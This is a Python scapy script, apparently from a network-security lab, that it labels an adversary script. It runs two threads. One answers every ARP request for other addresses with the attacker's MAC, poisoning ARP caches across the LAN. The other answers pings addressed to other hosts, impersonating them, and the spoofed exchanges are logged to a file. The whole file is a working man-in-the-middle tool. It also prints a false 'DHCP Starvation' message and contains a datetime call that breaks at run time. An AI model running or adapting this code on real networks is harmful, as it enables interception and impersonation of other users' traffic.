#python imports
import sys, datetime
from threading import Thread
from scapy.all import *
from scapy.all import Ether, ARP, IP, ICMP

INTERFACE = "eth0"
MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
MY_IP_ADDRESS = get_if_addr(INTERFACE)


class ARPSpoofer(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ARP') and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS

    def make_reply(self, request):
        response = Ether()/ARP()

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS
        write_file(f'Eth: src = {response[Ether].src} ,\t dst = {response[Ether].dst} \n')
        response[ARP].op = 2
        response[ARP].hwsrc = MY_MAC_ADDRESS
        response[ARP].hwdst = request[ARP].hwsrc
        response[ARP].psrc = request[ARP].pdst
        response[ARP].pdst = request[ARP].psrc
        write_file(f'ARP: src = {response[ARP].psrc} ,\t dst = {response[ARP].pdst} \n')
        print()

        return response[ARP]

class PingResponder(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ICMP') and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS

    def make_reply(self, request):
        response = Ether()/IP()/ICMP()/""

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[IP].src = request[IP].dst
        response[IP].dst = request[IP].src

        response[ICMP].type = 0
        response[ICMP].id = request[ICMP].id
        response[ICMP].seq = request[ICMP].seq

        response[Raw].load = request[Raw].load
        print()
        
        return response[IP]


def write_file(line):
        #input('write to file: ')
        #print('Writing.. \n')
        with open('data.txt', 'a+') as data:
                data.write(line)

ct = datetime.now()
print('\n\t Time = ', ct)

print("Adervsary Script Started..\nAttempting DHCP Starvation..\n")

arp_spoofer = Thread(target=ARPSpoofer())
arp_spoofer.start()

ping_responder = Thread(target=PingResponder())
ping_responder.start()

arp_spoofer.join()
ping_responder.join()


